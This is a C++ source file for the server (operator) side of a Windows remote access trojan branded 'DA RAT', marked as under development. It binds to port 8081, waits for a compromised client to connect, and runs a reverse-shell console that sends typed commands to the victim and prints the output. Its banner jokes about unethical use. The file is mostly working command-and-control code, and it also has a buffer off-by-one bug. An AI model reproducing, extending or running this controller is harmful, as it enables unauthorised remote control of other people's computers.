//compile ->  cl /EHsc server.cpp /link ws2_32.lib /OUT:server.exe
#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <tuple>
#include <atomic>

using namespace std;

#define MAX_IP_LENGTH 16
#define MAX_TEXT_LENGTH 256

int argc_global;
char **argv_global;
SOCKET listenSocket;
SOCKET clientSocket;

char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
char os;

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int socket_setup();
void send_data(SOCKET clientSocket, const string &data);
string receive_data(SOCKET clientSocket);

void os_detection();
bool getdata_from_file();
int Get_menu_option();

int Rev_Shell();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char *argv[]) 
{
    argc_global = argc;
    argv_global = argv;
    
    socket_setup();
    
    bool loop = true;
    while(loop)
    {
        switch (Get_menu_option())
        {
            case 1:
            {
                cout << "\n\nNEED To add code to download file from server to get\nip, verify if the comming connection is of that ip and then connect\n";
                system("pause");
                break;
            }
            
            case 2:
            {
                if(!Rev_Shell())
                {
                    cout << endl << ">> Closing Rev Shell..\n";
                    system("pause");
                }
                break;
            }
        
            case 0:
            {
                
                closesocket(clientSocket);
                closesocket(listenSocket);

                WSACleanup();
                cout << ">> Exiting..." << endl << endl;
                loop = false;
                break;
            }
            default:
            {

                cout << ">> Invalid option ( -_- )" << endl << endl;
                system("pause");
                break;
            }
        }
    }



    // printf("\n\n\tIP Address: %s\n", ipAddress);
    // printf("\tRandom Text: %s\n", randomText);
    // printf("\tOS: %c\n\n\n", os);

    return 0;
}

int socket_setup()
{
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
    {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) 
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8081);                                                                      
    serverAddr.sin_addr.s_addr = INADDR_ANY;                                                    // Any available network interface
    
    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "bind failed.\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    return 0;

}

void send_data(SOCKET clientSocket, const string &data)                                         // Doesnot send special data 
{
    int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
    if (bytesSent == SOCKET_ERROR) cerr << "Send failed with error: " << WSAGetLastError() << endl;
}

string receive_data(SOCKET clientSocket)
{
    char buffer[1024];                                                                           // Buffer to store received data
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

    if (bytesReceived > 0)
    {
        buffer[bytesReceived] = '\0';                                                           // Null-terminate the string
        string receivedData(buffer);                                                            // Store the data in a string
        return receivedData;
    }
    else if (bytesReceived == 0) cerr << "Connection closed by server." << std::endl;
    else cerr << "Receive failed with error: " << WSAGetLastError() << std::endl;

    return "";                                                                                  // Return an empty string in case of error or connection closure
}

void os_detection()
{
    #if defined(_WIN32) || defined(_WIN64)
        os = 'W';
    #elif defined(__linux__)
        os = 'L';
    #elif defined(__APPLE__) || defined(__MACH__)
        os = 'M';
    #elif defined(__unix__) || defined(__unix)
        os = 'U';
    #endif
}

bool getdata_from_file()
{
    FILE *sourceFile;
    const char *fileName = NULL;


    if (argc_global < 3) return false;

    if (strcmp(argv_global[1], "-f") == 0) fileName = argv_global[2];
    else return false;


    sourceFile = fopen(fileName, "r");
    if (sourceFile == NULL)
    {
        perror("\n\n\t|||||| Failed to open file ||||||\n\n");
        return false;
    }


    while (fscanf(sourceFile, "%15s", ipAddress) == 1)                                                // Read the IP address
    {        
        fgetc(sourceFile);                                                                            // Consume the newline character left by fscanf
        if (fgets(randomText, MAX_TEXT_LENGTH, sourceFile) != NULL)                                   // Read the random text
        {
            randomText[strcspn(randomText, "\n")] = '\0';                                             // Remove the newline character if it exists in randomText
        }
    }

    fclose(sourceFile);

    return true;
}

int Rev_Shell()
{
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        std::cerr << "listen failed.\n";
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "\n>> Waiting for incoming connections..." << endl;
    SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);
    
    cout << ">> Client connected!" << endl << "_______________________________________________________________\n\n\n";
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    atomic<bool> processFinished(false);
    
    auto readThread = std::thread([&]()
    {
        while (!processFinished.load())
        {
            string data = receive_data(clientSocket);
            if (data.empty()) break;                                                            // Client has disconnected or there was an error
            cout << data;
            Sleep(10);                                                                          // Sleep for a short time to prevent 100% CPU usage
        }
    });

    auto writeThread = std::thread([&]()
    {
        string cmd;
        while (!processFinished.load())                                                                     
        {
            if (getline(cin, cmd))                                                              //getline to allow multi-word commands
            {
                if (cmd == "exit")
                {
                    send_data(clientSocket, "exit");
                    processFinished.store(true);
                    break;
                }
                send_data(clientSocket, cmd);
            }
            Sleep(10);
        }
    });

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    // Wait for process threads to finish
    readThread.join();
    writeThread.join();
    processFinished.store(true);

    return 0;
}

int Get_menu_option()
{
    int option = 0;

    cout << R"(


                                  :::::::::      :::           :::::::::      ::: ::::::::::: 
                                 :+:    :+:   :+: :+:         :+:    :+:   :+: :+:   :+:      
                                +:+    +:+  +:+   +:+        +:+    +:+  +:+   +:+  +:+       
                               +#+    +:+ +#++:++#++:       +#++:++#:  +#++:++#++: +#+        
                              +#+    +#+ +#+     +#+       +#+    +#+ +#+     +#+ +#+         
                             #+#    #+# #+#     #+#       #+#    #+# #+#     #+# #+#          
                            #########  ###     ###       ###    ### ###     ### ###           

                                            [::] Made By Oorth :) [::]              
                                    
                                    [::] Use this Ethically, if you dont [::]
                                        [::] I'll just enjoy watching  [::]

                                            [::] UNDER DEVELOPMENT!! [::]
          
                            _________________________________________________________
                                                
                                                [::] Menu :) [::]               
                                    
                                    Connect a target                        1
                                    Rev Shell                               2
            
                                    Exit                                    0

)";

    cout << ">> ";
    cin >> option;
    return option;
}
